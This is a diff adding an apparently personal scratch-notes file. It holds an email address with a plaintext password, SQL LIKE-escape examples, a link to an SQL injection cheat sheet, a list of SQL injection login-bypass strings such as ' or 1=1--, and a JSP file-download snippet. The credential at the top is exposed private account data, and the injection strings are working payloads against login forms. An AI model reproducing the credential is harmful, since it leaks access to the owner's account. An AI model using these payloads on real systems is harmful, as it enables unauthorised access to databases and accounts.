@@ -1,0 +1,42 @@
+ email = pythonfabhost2021@gmail.com  
+  password = ynjohoeoaupmrtaf
+
+
+
+
+SELECT name FROM emp WHERE id LIKE '%/_%' ESCAPE '/';
+
+SELECT name FROM emp WHERE id LIKE '%\%%' ESCAPE '\';
+
+
+Sql injection cheat sheet website =https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+
+
+
+download
+
+
+<%    
+  String filename = "home.jsp";   
+  String filepath = "e:\\";   
+  response.setContentType("APPLICATION/OCTET-STREAM");   
+  response.setHeader("Content-Disposition","attachment; filename=\"" + filename + "\"");   
+  
+  java.io.FileInputStream fileInputStream=new java.io.FileInputStream(filepath + filename);  
+            
+  int i;   
+  while ((i=fileInputStream.read()) != -1) {  
+    out.write(i);   
+  }   
+  fileInputStream.close();   
+%>   
